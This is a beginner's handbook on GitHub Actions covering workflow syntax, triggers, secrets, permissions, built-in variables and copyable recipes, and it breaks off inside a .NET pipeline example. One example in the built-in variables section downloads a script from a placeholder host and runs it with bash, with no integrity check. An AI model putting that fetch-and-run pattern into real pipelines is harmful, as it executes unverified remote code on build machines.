# The GitHub Actions Handbook

A book-length walk through GitHub Actions, written the way I wish someone had explained it to me the first time. Everything a beginner needs — concepts, syntax, recipes, real-world patterns, debugging, security, billing — but in plain language, one idea at a time.

If you just want a taste, read sections 1 to 4 and you'll be writing workflows by lunch. The rest of the document is here when you need it.

---

## Table of Contents

1. What GitHub Actions actually is
2. The six words that matter
3. A quick YAML primer
4. Your first workflow (and what you'll see after)
5. Reading a real workflow file
6. Triggers — when things run
7. Jobs and steps — the shape of everything
8. Using other people's actions
9. Secrets and environment variables
10. Permissions, contexts, and the built-in variables you'll actually use
11. Recipes you'll probably copy
12. Real-world pipeline patterns
13. When you start repeating yourself
14. Debugging, and running workflows on your laptop
15. Security scanning — the stuff you shouldn't skip
16. Billing, minutes, and how not to burn through them
17. From push to production — the end-to-end flow
18. GitHub Actions vs Azure DevOps Pipelines
19. Abbreviations, defined

---

## 1. What GitHub Actions actually is

Here's the honest one-sentence version: GitHub Actions is a way to run scripts when stuff happens in your repo. That's it.

Someone pushes code, you can run a script. Someone opens a pull request, you can run a script. It's 3 AM on a Tuesday, you can run a script. All the vocabulary — workflows, jobs, steps, runners — is just names for the pieces of the system that does exactly this one thing.

The point of the tool is to do the boring reliable work so humans can do the interesting unreliable work. Run your tests automatically. Deploy when a tag is cut. Label new issues. Clean up stale branches. Anything you'd otherwise ask someone to remember to do, a workflow can do for you, every single time, without complaint.

### How it works under the hood

When a triggering event fires in your repository, GitHub looks in `.github/workflows/` for YAML files that care about that event. For any that do, GitHub spins up a brand new virtual machine (called a **runner**), clones your code onto it, runs the steps you listed, and then throws the machine away.

**Yes — GitHub really spins up a fresh VM each time.** Not a container, not a reused machine. A real Ubuntu / macOS / Windows VM that boots, runs your job, and gets destroyed. It comes pre-loaded with the tools most workflows need: `git`, Docker, Node, Python, Java, the GitHub CLI, kubectl, and dozens more. If your job needs something that isn't there, you install it as a step.

Fresh machine every time is why CI is reliable. There's no leftover state from yesterday's broken run, no `node_modules` from a different branch, no half-installed dependencies. Every run starts from zero.

### What people use it for

Four big buckets, roughly:

- **CI** — testing, linting, type-checking, building. Every push, every PR.
- **CD** — deploying code to dev, staging, or production when certain events happen.
- **Chores** — labeling issues, closing stale PRs, generating changelogs.
- **Scheduled tasks** — nightly cleanups, weekly reports, monthly cache resets.

If you can express the work as a script, you can automate it here.

---

## 2. The six words that matter

Almost every conversation about GitHub Actions uses the same handful of words. Learn these and you'll follow 90% of any workflow file.

- **Workflow**. A YAML file in `.github/workflows/`. Defines one piece of automation.
- **Event**. Something that triggers a workflow — push, pull request, schedule, manual click, etc.
- **Job**. A group of steps that run on the same runner.
- **Step**. A single task — either a shell command or a pre-packaged "action."
- **Action**. A reusable unit of code, like a function you can call from a step.
- **Runner**. The virtual machine (Ubuntu, macOS, or Windows) your job runs on.

The mental model is nested: a workflow contains jobs, jobs contain steps, steps run commands or call actions. Hold that picture in your head and the rest is just details.

---

## 3. A quick YAML primer

Every workflow file is YAML. It's not a hard format, but it has a few rules that, if you break them, will make your workflow mysteriously stop working. Get these right and you'll save yourself a lot of confusion.

### Indentation is structure

Use spaces, never tabs. Pick two spaces per level and stay consistent. The indentation literally defines which thing is nested inside which.

```yaml
jobs:
  build:                     # 2 spaces in
    runs-on: ubuntu-latest   # 4 spaces in
    steps:
      - run: echo hi         # 6 spaces in
```

### Key-value pairs use colon-space

```yaml
name: CI
runs-on: ubuntu-latest
```

That space after the colon is required. `name:CI` won't parse.

### Lists use a leading dash

```yaml
branches:
  - main
  - develop
```

When the list items are themselves maps (like workflow steps), each item starts with `-`:

```yaml
steps:
  - name: Checkout
    uses: actions/checkout@v4
  - name: Test
    run: npm test
```

### Strings: quote when in doubt

Most of the time, plain strings just work:

```yaml
name: My Workflow
```

But quote anything that contains special characters or looks like another type. This bites a lot of beginners:

```yaml
cron: '0 3 * * *'
version: '3.10'     # without quotes YAML reads this as the number 3.1
```

### Multiline strings: `|` or `>`

YAML gives you two ways to write a value that spans several lines, and they behave very differently. Pick the wrong one and your shell script collapses into one giant line that fails in confusing ways.

**`|` (literal block scalar)** — preserves every line break exactly as you wrote it. The result is multi-line. This is what you want for shell scripts:

```yaml
steps:
  - name: Run several commands
    run: |
      echo "line one runs first"
      echo "line two runs second"
      ./scripts/build.sh
```

**`>` (folded block scalar)** — replaces every line break with a single space, producing one long string. Useful for prose-style values where you want to wrap a long sentence in your YAML for readability but the value itself should be one line:

```yaml
steps:
  - name: Set a long description
    run: >
      this entire block
      becomes one
      single line of text
```

**Rule of thumb**: shell commands → `|`. Anything else → you probably don't need it; just write it on one line.

### Comments

Anything after `#` on a line is ignored:

```yaml
runs-on: ubuntu-latest   # GitHub-hosted Ubuntu
```

### The mistakes that will bite you

These are the ones I see beginners hit, over and over. Keep them in mind.

| Mistake | What happens | Fix |
|---------|--------------|-----|
| Mixing tabs and spaces | "mapping values are not allowed here" | Spaces only. Configure your editor. |
| No space after `:` | Parse error | `key: value`, not `key:value`. |
| Inconsistent indentation | Keys silently vanish | Pick two spaces, stick to it. |
| Unquoted version numbers | `3.10` becomes `3.1` | Quote it: `'3.10'`. |
| Missing `-` on list items | Only the last item wins | Every list item needs its own `-`. |

---

## 4. Your first workflow (and what you'll see after)

Let's build the smallest workflow that works, so you have something real to look at.

### Step 1 — Create the file

In your repo, create `.github/workflows/hello.yml`:

```yaml
name: Hello World

on: [push]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Say hello
        run: echo "Hello, world!"
```

### What this file actually says

Read it left to right, top to bottom:

- `name: Hello World` — the friendly name you'll see in the Actions tab.
- `on: [push]` — the trigger. Every time *anyone* pushes a commit to *any* branch in this repo, this workflow fires. So pushing to `main`, pushing to a feature branch, or merging a PR (which results in a push to the target branch) all trigger it. We'll narrow this later — `on: { push: { branches: [main] } }` would only fire on `main`.
- `jobs:` — start of the jobs list. We have one job called `greet`.
- `runs-on: ubuntu-latest` — run this job on a fresh GitHub-hosted Ubuntu VM.
- `steps:` — the work this job does. One step here, named "Say hello", which runs a shell command.

That's the whole file. The shape never gets more complicated than that — only longer.

### Step 2 — Commit and push

```bash
git add .github/workflows/hello.yml
git commit -m "Add hello workflow"
git push
```

### Step 3 — Watch it run

Open your repository on GitHub, click the **Actions** tab, and you'll see your workflow running. Click into it and you can see the logs.

That's the full cycle. You just automated something. Useless, but still — the shape of this file is the shape of every workflow you'll ever write. Everything else is just more of the same.

### The Actions UI, in a quick tour

Before you write any more workflows, spend two minutes getting familiar with the Actions tab. You'll spend a lot of time here.

- **Left sidebar** lists your workflows — one entry per YAML file. Click one to filter runs.
- **Main pane** is the list of runs. Each row shows the event that triggered it, the branch, the commit, and the status (green check, red X, yellow dot).
- **Click a run** and you see the **job graph** — boxes connected by arrows, matching your `needs:` structure.
- **Click a job** and you see its steps with collapsible logs. Red = this step failed.
- **Top right** has the "Re-run all jobs" and "Re-run failed jobs" buttons. The second one is faster and keeps artifacts from the successful jobs.
- **Summary tab** shows high-level status, artifact download links, and billable minutes for this run.
- **Artifacts** sit at the bottom of the Summary tab and stick around for 90 days by default.

---

## 5. Reading a real workflow file

The hello world above is too small to be educational. Here's something closer to what you'll see in a real repo, broken down key by key.

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

env:
  NODE_VERSION: '20'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Node
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test
```

### What every piece does

- **`name`** — the friendly name shown in the Actions tab. Optional, but your future self will thank you.
- **`on`** — the trigger. Here, the workflow runs on any push or PR targeting `main`.
- **`env`** — environment variables, available to every job and step in this file. You can also set them per-job or per-step if you want tighter scope.
- **`jobs`** — the jobs in this workflow. Each key under `jobs:` (like `test`) is a job ID.
- **`runs-on`** — which runner to use. Common choices: `ubuntu-latest`, `macos-latest`, `windows-latest`.
- **`uses`** — calls a pre-built action. `actions/checkout@v4` clones your repo. You'll use this one in nearly every workflow.
- **`with`** — arguments for the action you're calling.
- **`run`** — just runs a shell command directly.

That's all the top-level syntax in a real workflow. Everything else is variations.

---

## 6. Triggers — when things run

The `on:` key decides what causes your workflow to fire. Here are the ones you'll reach for most often.

### Push and pull request

The workhorse pair:

```yaml
on:
  push:
    branches: [main, develop]
    paths: ['src/**']           # only when files under src/ change
  pull_request:
    branches: [main]
```

### Schedule (cron)

```yaml
on:
  schedule:
    - cron: '0 0 * * *'         # every day at midnight UTC
```

The cron format is `minute hour day-of-month month day-of-week`. If you haven't written cron in a while, [crontab.guru](https://crontab.guru) is great for building expressions without breaking anything.

One gotcha: GitHub schedules are UTC, not your local timezone. Adjust accordingly.

### Manual trigger

Sometimes you want a button. `workflow_dispatch` gives you one:

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Where to deploy'
        required: true
        default: 'staging'
        type: choice
        options: [staging, production]
```

You'll get a "Run workflow" button in the Actions tab, with a dropdown for `environment`. Grab it inside your workflow as `${{ inputs.environment }}`.

### Others worth knowing

- `issues` — an issue was opened, edited, or closed
- `issue_comment` — someone commented on an issue or PR
- `release` — a release got published
- `workflow_call` — makes the workflow reusable from other workflows (more on this later)

---

## 7. Jobs and steps — the shape of everything

Two rules will take you most of the way:

**Jobs run in parallel by default.** If a workflow has `lint` and `test`, both run at the same time on separate runners. You don't have to do anything — parallelism is the default.

A quick aside since these two names show up everywhere:

- **Lint** is a static analysis step. It reads your code without running it and flags style problems, unused variables, unsafe patterns, missing types, and other things a careful human reviewer would catch. Common linters: ESLint (JavaScript / TypeScript), Pylint or Ruff (Python), golangci-lint (Go), `dotnet format` (C#), RuboCop (Ruby).
- **Test** is your test suite — unit tests, integration tests, end-to-end tests. It actually runs your code and verifies it behaves the way it's supposed to. Common runners: Jest, Pytest, Go's built-in `go test`, `dotnet test`, JUnit.

Lint catches "this looks wrong." Test catches "this *is* wrong." You usually want both, in parallel, on every PR.

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run lint

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
```

**Use `needs:` to run jobs in sequence.**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "building"

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploying"
```

`deploy` now waits for `build` to succeed. If `build` fails, `deploy` doesn't run.

That's the whole model. Everything complicated in workflows comes from combining these two rules.

### Sharing data between steps

Sometimes one step generates a value that the next step needs. Steps can write to a special file called `$GITHUB_OUTPUT`:

```yaml
steps:
  - name: Generate version
    id: version
    run: echo "tag=v1.2.3" >> $GITHUB_OUTPUT

  - name: Use version
    run: echo "Tag is ${{ steps.version.outputs.tag }}"
```

Note the `id:` on the first step — that's how the second step references it.

### Sharing data between jobs

Jobs run on different runners, so they can't just read each other's files. Instead, upload an artifact in one job and download it in another:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "result" > output.txt
      - uses: actions/upload-artifact@v4
        with:
          name: my-output
          path: output.txt

  use-it:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: my-output
      - run: cat output.txt
```

Artifacts stick around for 90 days by default. The four times you'll actually reach for them:

| Use case | Why artifacts fit |
|----------|-------------------|
| Build job → deploy job | Deploy needs the binary, but they run on different machines. Upload from build, download in deploy. |
| Test job → coverage report | You want the report viewable for 90 days without keeping the runner alive. |
| Failed run debugging | Upload everything in `RUNNER_TEMP` on failure so you can download it after the run dies. |
| Passing data forward without a database | E.g., a build manifest, generated SQL migration files, screenshot diffs. |

You can also download artifacts from the Actions tab UI — handy when you want to grab a CI-built binary onto your laptop without rebuilding locally.

---

## 8. Using other people's actions

The Actions Marketplace is full of pre-built steps. You can browse it at [github.com/marketplace](https://github.com/marketplace?type=actions). These are the LEGO bricks of the GitHub Actions world, and most workflows are mostly made of them.

### How you call one

```yaml
- uses: owner/repo@version
  with:
    input-name: value
```

### The ones you'll actually use

| Action | What it does |
|--------|--------------|
| `actions/checkout@v4` | Clones your repo onto the runner. Almost every workflow needs it. |
| `actions/setup-node@v4` | Installs Node.js. |
| `actions/setup-python@v5` | Installs Python. |
| `actions/setup-java@v4` | Installs Java. |
| `actions/cache@v4` | Caches files between runs (big speedup). |
| `actions/upload-artifact@v4` | Saves files from a run for later. |
| `actions/download-artifact@v4` | Grabs saved files. |

### Pinning versions — and why it matters

When you write `@v4`, you get the latest release in the v4.x line. Convenient, but it means "the code you run tomorrow might not be the code you ran today."

Your options:

- `@v4` — latest in the v4 range. Fine for actions maintained by GitHub itself.
- `@v4.1.2` — an exact version. More stable.
- `@<commit-sha>` — pinned to a specific commit. Most secure — no one can change what you run by pushing a new tag.
- `@main` — whatever is on the action's main branch *right now*. Please don't.

For third-party actions, especially anything that handles secrets, pin to a commit SHA. It's the only way to guarantee the code doesn't change under you.

---

## 9. Secrets and environment variables

Never commit passwords, API keys, or tokens to your repo. This is the rule that doesn't bend. Secrets go in GitHub's secret storage, which encrypts them and redacts them from logs.

### Adding a secret

Repo → **Settings** → **Secrets and variables** → **Actions** → **New repository secret**. Give it a name and a value. That's it.

### Using it in a workflow

```yaml
steps:
  - name: Deploy
    env:
      API_KEY: ${{ secrets.API_KEY }}
    run: ./deploy.sh
```

The `${{ secrets.API_KEY }}` expression is what pulls it in. If it shows up in logs, it'll be replaced by `***`.

### The built-in secret you already have

`secrets.GITHUB_TOKEN` is auto-generated for every workflow run. It's scoped to your repository and lasts only as long as the run. Use it for anything that talks to the GitHub API — comment on PRs, push releases, label issues. You don't need to create a personal token for this.

### Pulling secrets from Azure Key Vault

GitHub Secrets is fine for small teams. But if your org standardizes on **Azure Key Vault** for everything (a lot of enterprises do — it gives them audit trails, automatic rotation, and a single place to revoke access), you don't want to copy every secret into GitHub Secrets too. Better to fetch them at runtime.

The pattern is:

1. Authenticate to Azure from the workflow (preferably via OIDC, no stored credentials).
2. Pull the secrets you need from Key Vault into the workflow's environment.
3. Use them like any other env variable.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write          # required for OIDC to Azure
      contents: read
    steps:
      - uses: actions/checkout@v4

      # Step 1 — log in to Azure using OIDC (federated credential on an AD app).
      - uses: azure/login@v2
        with:
          client-id:       ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id:       ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      # Step 2 — pull secrets from the vault into step outputs.
      - name: Fetch secrets from Key Vault
        id: kv
        uses: azure/get-keyvault-secrets@v1
        with:
          keyvault: my-prod-keyvault
          secrets:  'API-KEY, DB-CONN-STR'

      # Step 3 — use them in later steps.
      - name: Deploy
        env:
          API_KEY:     ${{ steps.kv.outputs.API-KEY }}
          DB_CONN_STR: ${{ steps.kv.outputs.DB-CONN-STR }}
        run: ./deploy.sh
```

Three things worth knowing:

- **OIDC over stored secrets**: the `azure/login` example uses GitHub Secrets only for non-sensitive IDs (client, tenant, subscription). The actual auth is OIDC, so no service principal password lives in GitHub.
- **Secret values stay masked**: anything fetched via `get-keyvault-secrets` is automatically registered as a secret for that run, so it gets `***` in logs the same way native GitHub Secrets do.
- **Hyphens in names**: Key Vault doesn't allow underscores in secret names, so most teams use hyphens. That's why you see `API-KEY` in the example.

### Environment variables — three scopes

You can set env vars at three different levels, and each has different visibility. Knowing which to use is mostly about scoping the surface — the smaller the scope, the safer.

```yaml
env:
  APP_ENV: production         # workflow-level — every job sees it

jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      REGION: us-east-1       # job-level — every step in this job
    steps:
      - name: Deploy
        env:
          DRY_RUN: 'false'    # step-level — just this one step
        run: ./deploy.sh
```

Same scope concept in plain English:

| Scope | Defined where | Who sees it | Good for |
|-------|---------------|-------------|----------|
| Workflow | `env:` at the top of the file | Every job, every step | Truly global values: a default region, a Node version used everywhere. |
| Job | `env:` inside one job | Every step in that job | Values one job needs but others don't — e.g., the deploy job needs an environment URL but tests don't. |
| Step | `env:` on a single step | That one step only | Single-shot values you don't want bleeding into later steps. |

Lower scopes win when names collide. If `REGION` is set at the workflow level *and* the job level, the job's value is what the steps inside that job see. If a step also sets `REGION`, the step's value wins for that step.

### Dynamic env vars

If you need to set an env var at runtime (say, the current build ID):

```yaml
- run: echo "BUILD_ID=$(date +%s)" >> $GITHUB_ENV
- run: echo "Build ID is $BUILD_ID"
```

Writing to `$GITHUB_ENV` makes it available to all later steps in the same job.

---

## 10. Permissions, contexts, and the built-in variables you'll actually use

This is the section that fixes the most beginner confusion. Most "why isn't this working" questions come back to one of these three topics.

### 10.1 The permissions model

Every workflow run gets `GITHUB_TOKEN` automatically. But since 2023, new repositories ship with **read-only defaults** for that token. If your workflow tries to comment on a PR, label an issue, or push a tag, it'll blow up with a very confusing message:

```
Error: Resource not accessible by integration
```

The fix is to ask for what you need:

```yaml
permissions:
  contents: read
  issues: write
  pull-requests: write
```

Set at the workflow level (above the `jobs:` key) and it applies to everything. Or set it per job if you want tighter control — which is the safer habit:

```yaml
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      - run: echo "label the issue"
```

### The scopes you'll see most

| Scope | When you need it |
|-------|------------------|
| `contents: write` | Pushing commits, creating tags or releases. |
| `issues: write` | Creating, commenting on, or labeling issues. |
| `pull-requests: write` | Commenting on or updating PRs. |
| `packages: write` | Publishing to GitHub Packages / GHCR. |
| `actions: write` | Triggering other workflows, cancelling runs. |
| `id-token: write` | OIDC auth to AWS, Azure, or GCP. |

If you want to lock everything down, `permissions: {}` grants nothing. Useful for paranoid workflows.

### 10.2 Contexts and the `${{ ... }}` expression syntax

Anywhere you see `${{ something }}`, that's an **expression** — a tiny bit of logic evaluated at runtime. Expressions read from **contexts**, which are pre-populated objects with runtime data.

Here are the ones you'll actually use:

| Context | What's in it | Example |
|---------|--------------|---------|
| `github` | Event info, repo, actor, SHA, ref. | `${{ github.actor }}` |
| `env` | Env variables you set. | `${{ env.NODE_VERSION }}` |
| `secrets` | Secrets from settings. | `${{ secrets.API_KEY }}` |
| `vars` | Non-secret config variables. | `${{ vars.DEPLOY_REGION }}` |
| `steps` | Outputs from earlier steps in this job. | `${{ steps.build.outputs.tag }}` |
| `jobs` | Outputs from earlier jobs in this workflow. | `${{ needs.build.outputs.version }}` |
| `runner` | The runner's OS, arch, temp dirs. | `${{ runner.os }}` |
| `inputs` | `workflow_dispatch` or `workflow_call` inputs. | `${{ inputs.environment }}` |

### Using expressions in `if:`

This is where expressions earn their keep. Conditional execution:

```yaml
steps:
  - name: Deploy only from main
    if: github.ref == 'refs/heads/main'
    run: ./deploy.sh

  - name: Run on failure
    if: failure()
    run: echo "something went wrong"

  - name: Skip dependabot PRs
    if: github.actor != 'dependabot[bot]'
    run: npm test
```

Useful status functions: `success()`, `failure()`, `cancelled()`, `always()`.

### 10.3 The built-in environment variables

GitHub gives every step a handful of env vars automatically — no setup required. In a shell, use them as `$VAR` on Linux / Mac and `$env:VAR` in Windows PowerShell. They're also accessible inside expressions as `${{ github.* }}` and `${{ runner.* }}`.

Here's the reference table, then a small example for each variable so you can see when you'd actually reach for it.

| Variable | What it is | Typical use |
|----------|------------|-------------|
| `GITHUB_SHA` | The 40-char commit SHA for this run. | Tagging Docker images, generating unique build IDs. |
| `GITHUB_REF` | Full ref — `refs/heads/<branch>` or `refs/tags/<tag>`. | Conditional logic. |
| `GITHUB_REF_NAME` | Short ref — `main`, `v1.2.0`, `feature/x`. | Human-readable tags, image labels. |
| `GITHUB_ACTOR` | The username that triggered the run. | Audit logs, deny-listing bots. |
| `GITHUB_REPOSITORY` | `owner/repo`. | API calls, image names. |
| `GITHUB_WORKSPACE` | Absolute path to the checked-out repo on the runner. | Building absolute script paths. |
| `GITHUB_RUN_ID` | Unique numeric ID for this run. | Linking back to logs from external systems. |
| `GITHUB_EVENT_NAME` | The triggering event — `push`, `pull_request`, `schedule`. | Branching logic in workflows that handle multiple events. |
| `RUNNER_OS` | `Linux`, `macOS`, or `Windows`. | OS-specific shell paths. |
| `RUNNER_ARCH` | `X64`, `ARM64`, etc. | Downloading the right binary. |
| `RUNNER_TEMP` | Scratch directory, cleaned after the job. | Temp files, downloaded installers. |

A small worked example for each:

```yaml
# GITHUB_SHA — tag an image with the exact commit
- run: docker build -t myapp:$GITHUB_SHA .

# GITHUB_REF — only run a step when on main
- if: github.ref == 'refs/heads/main'
  run: ./deploy-prod.sh

# GITHUB_REF_NAME — readable image tag (main, v1.2.0)
- run: docker tag myapp:$GITHUB_SHA myapp:$GITHUB_REF_NAME

# GITHUB_ACTOR — who's running this?
- run: echo "Run started by $GITHUB_ACTOR"

# GITHUB_REPOSITORY — building a registry image name
- run: docker push ghcr.io/$GITHUB_REPOSITORY:latest

# GITHUB_RUN_ID — link back to the run from Slack
- run: |
    URL="$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
    echo "Failed run: $URL"

# RUNNER_OS — branch on OS in a cross-platform job
- run: |
    if [ "$RUNNER_OS" = "Linux" ]; then
      ./scripts/install-linux.sh
    else
      ./scripts/install-mac.sh
    fi

# RUNNER_TEMP — scratch directory that's cleaned up automatically
- run: |
    curl -o $RUNNER_TEMP/installer https://example.com/install.sh
    bash $RUNNER_TEMP/installer
```

And one putting several together:

```yaml
- name: Build and tag image
  run: |
    docker build -t myapp:$GITHUB_SHA .
    docker tag myapp:$GITHUB_SHA myapp:$GITHUB_REF_NAME
    echo "Built by $GITHUB_ACTOR on $RUNNER_OS, run $GITHUB_RUN_ID"
```

---

## 11. Recipes you'll probably copy

These are the automations most teams end up with. Copy, tweak, commit.

### Recipe 1 — Tests on every PR

Nothing fancy, just the bread and butter.

```yaml
name: Tests

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm test
```

### Recipe 2 — Deploy when a tag is pushed

Pair this with a manual `git tag v1.0.0 && git push origin v1.0.0` and you have a release button.

```yaml
name: Deploy

on:
  push:
    tags: ['v*']

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
        run: ./deploy.sh
```

**A note on `secrets.DEPLOY_KEY`.** That name is just a placeholder — the value comes from a GitHub Secret you create yourself. Open the repo's **Settings → Secrets and variables → Actions → New repository secret**, name it `DEPLOY_KEY`, and paste in whatever your deploy script needs to authenticate: an SSH private key, an API token, a hosting-provider credential. The workflow reads it as `${{ secrets.DEPLOY_KEY }}` and exposes it to the script as the env var `$DEPLOY_KEY`. You can call it whatever you want — `PROD_TOKEN`, `RAILWAY_KEY`, `SSH_DEPLOY_KEY` — as long as the secret name in Settings and the reference in the workflow match.

### Recipe 3 — A nightly cleanup job

Every team has at least one of these — old preview envs, orphaned test databases, expired tokens.

```yaml
name: Nightly Cleanup

on:
  schedule:
    - cron: '0 3 * * *'
  workflow_dispatch:

jobs:
  cleanup:
    runs-on: ubuntu-latest
    steps:
      - run: ./scripts/cleanup.sh
```

### Recipe 4 — Label new issues automatically

Uses `actions/github-script`, which is a handy way to call the GitHub API from a workflow without writing a whole action.

```yaml
name: Label Issues

on:
  issues:
    types: [opened]

jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.addLabels({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              labels: ['needs-triage']
            })
```

### Recipe 5 — Test across multiple OS and versions (matrix)

When your code has to work on more than one thing, a matrix runs all combinations in parallel:

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        node: [18, 20, 22]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm test
```

This fires nine jobs — three OSes times three Node versions — all at once.

**"What if I have three *different* tasks, each needing its own OS?"** That's a common follow-up. Matrix is for running the **same steps** with different parameters. If your three tasks are genuinely different — say, "build the Linux binary," "build the Mac DMG," and "build the Windows installer" — don't force them into a matrix. Just declare three jobs, each with its own `runs-on`:

```yaml
jobs:
  build-linux:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./scripts/build-linux.sh
      - uses: actions/upload-artifact@v4
        with:
          name: linux-binary
          path: dist/myapp-linux

  build-mac:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./scripts/build-mac.sh
      - uses: actions/upload-artifact@v4
        with:
          name: mac-dmg
          path: dist/myapp.dmg

  build-windows:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - run: .\scripts\build-windows.ps1
      - uses: actions/upload-artifact@v4
        with:
          name: windows-installer
          path: dist/myapp-setup.exe
```

All three run in parallel (no `needs:`), each on the OS it needs, each producing its own artifact. The rule of thumb: **matrix for "same work, different inputs"; separate jobs for "different work."**

### Recipe 6 — Build and push a Docker image

Pushes to GitHub's own container registry (GHCR). The built-in `GITHUB_TOKEN` is enough — no Docker Hub account required.

```yaml
name: Build and Push Image

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: |
            ghcr.io/${{ github.repository }}:latest
            ghcr.io/${{ github.repository }}:${{ github.sha }}
```

### Recipe 7 — Cache dependencies for speed

One of the biggest bang-for-buck changes you can make. The cache key only changes when your lockfile changes, so unchanged dependencies come straight out of cache. Typical 5–10× speedup.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Restore npm cache
        uses: actions/cache@v4
        with:
          path: ~/.npm
          key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-npm-

      - uses: actions/setup-node@v4
        with:
          node-version: '20'

      - run: npm ci
      - run: npm test
```

### Recipe 8 — Notify Slack when the deploy breaks

You want to know when main is broken before your users do.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        run: ./deploy.sh

      - name: Notify Slack on failure
        if: failure()
        uses: slackapi/slack-github-action@v1
        with:
          payload: |
            {
              "text": ":x: Deploy failed on ${{ github.ref_name }} by ${{ github.actor }}\n<${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|View run>"
            }
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
          SLACK_WEBHOOK_TYPE: INCOMING_WEBHOOK
```

The `if: failure()` is the important bit — it makes the step run only when an earlier step in the same job has failed.

### Recipe 9 — Notify Microsoft Teams instead of Slack

Same idea as Recipe 8, different chat tool. Teams accepts incoming webhooks and renders Adaptive Cards. The only real difference is the JSON shape.

**Setting up the webhook in Teams** (one-time):

1. Open the channel where alerts should land.
2. Click the three-dot menu next to the channel name → **Workflows** → **Post to a channel when a webhook request is received**.
3. Walk through the dialog (it'll auto-pick the channel) and copy the webhook URL it gives you.
4. In your repo: **Settings → Secrets and variables → Actions → New repository secret**, name it `TEAMS_WEBHOOK_URL`, paste the URL.

**The workflow step**:

```yaml
- name: Notify Teams on failure
  if: failure()
  run: |
    curl -H 'Content-Type: application/json' \
         -d '{
           "type": "message",
           "attachments": [{
             "contentType": "application/vnd.microsoft.card.adaptive",
             "content": {
               "type": "AdaptiveCard",
               "version": "1.4",
               "body": [
                 {
                   "type": "TextBlock",
                   "text": "❌ Deploy failed on ${{ github.ref_name }}",
                   "weight": "Bolder",
                   "size": "Medium",
                   "color": "Attention"
                 },
                 {
                   "type": "TextBlock",
                   "text": "Author: ${{ github.actor }} • Run #${{ github.run_id }}",
                   "isSubtle": true,
                   "wrap": true
                 },
                 {
                   "type": "TextBlock",
                   "text": "[View run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})",
                   "wrap": true
                 }
               ]
             }
           }]
         }' \
         "${{ secrets.TEAMS_WEBHOOK_URL }}"
```

A few quick gotchas:

- **Adaptive Cards vs plain text** — you *can* send `{"text": "deploy failed"}` and Teams will accept it, but the card format gives you bold, color, and clickable links. Worth the extra ten lines.
- **Webhook URL is a secret** — anyone with the URL can post to your channel. Treat it like a credential.
- **Per-channel webhooks** — each channel needs its own webhook. If you alert different channels for prod vs staging, store two secrets.

---

### Recipe 10 — A complete .NET pipeline (worked example)

A real-world CI/CD workflow for a typical .NET 8 web app, from PR to production. It pulls in matrix testing, dependency caching, OIDC to Azure, ACR push, and Azure App Service deploy — all the pieces from earlier sections, composed.

#### The end-to-end .NET workflow

```yaml
name: .NET CI/CD

on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

env:
  DOTNET_VERSION: '8.0.x'
  CONFIGURATION: Release
  ACR_NAME: mycompanyregistry
  IMAGE_NAME: myapp
  APP_SERVICE_NAME: my-dotnet-app

jobs:
  # ───── CI: lint, build, test on every push and PR ─────
  build-and-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

